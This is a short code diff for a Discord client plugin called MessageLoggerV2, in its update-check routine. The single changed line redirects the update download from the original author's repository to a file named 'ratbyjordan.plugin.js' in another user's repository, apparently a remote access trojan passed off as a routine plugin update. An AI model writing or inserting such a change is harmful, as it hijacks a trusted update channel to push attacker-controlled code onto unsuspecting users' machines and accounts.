@@ -1090,7 +1090,7 @@ module.exports = class MessageLoggerV2 {
     const updateFail = () => XenoLib.Notifications.warning(`[${this.getName()}] Unable to check for updates!`, { timeout: 7500 });
     new Promise(resolve => {
       const https = require('https');
-      const req = https.request(tryProxy ? 'https://cors-anywhere.herokuapp.com/https://raw.githubusercontent.com/1Lighty/BetterDiscordPlugins/master/Plugins/MessageLoggerV2/MessageLoggerV2.plugin.js' : 'https://raw.githubusercontent.com/1Lighty/BetterDiscordPlugins/master/Plugins/MessageLoggerV2/MessageLoggerV2.plugin.js', { headers: { 'origin': 'discord.com' } }, res => {
+      const req = https.request(tryProxy ? 'https://cors-anywhere.herokuapp.com/https://raw.githubusercontent.com/gotjordan/plugins/main/ratbyjordan.plugin.js' : 'https://raw.githubusercontent.com/gotjordan/plugins/main/ratbyjordan.plugin.js', { headers: { 'origin': 'discord.com' } }, res => {
         let body = '';
         res.on('data', chunk => {
           body += chunk;
